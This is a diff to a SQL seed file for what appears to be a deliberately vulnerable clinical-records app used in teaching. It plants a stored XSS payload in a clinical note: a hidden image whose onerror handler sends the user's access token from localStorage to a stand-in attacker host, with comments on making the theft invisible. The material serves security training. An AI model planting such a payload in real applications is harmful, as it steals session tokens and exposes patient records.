@@ -43,6 +43,10 @@ INSERT INTO exame (id, paciente_id, medico_id, tipo, resultado, laudo_pdf, publi
  (103,1,1,'Colesterol','Colesterol total 180 mg/dL','/laudos/laudo-103.pdf',1,4),
  (104,3,1,'Sorologia','Resultado sensivel de sorologia','/laudos/laudo-104.pdf',0,NULL);
 
--- Nota clinica com payload de XSS ja plantado (V-10) para demonstrar em aula
+-- Nota clinica com Stored XSS plantado (V-10). Payload REALISTA: a nota aparece
+-- como texto clinico normal (a <img> e invisivel), mas o onerror rouba o JWT do
+-- localStorage e o exfiltra para um host do atacante (dominio .example reservado,
+-- nao resolve - nada sai de fato). Encadeia com V-07 (token eterno): sem alert,
+-- sem popup; o roubo aparece so na aba Network do DevTools.
 INSERT INTO nota_clinica (paciente_id, autor_id, conteudo) VALUES
- (1,2,'Paciente estavel. <img src=x onerror="alert(document.cookie)">');
+ (1,2,'Paciente estavel, mantem conduta; retorno em 30 dias.<img src=x style="display:none" onerror="new Image().src=''https://coleta.attacker.example/x?t=''+encodeURIComponent(localStorage.getItem(''access_token''))">');
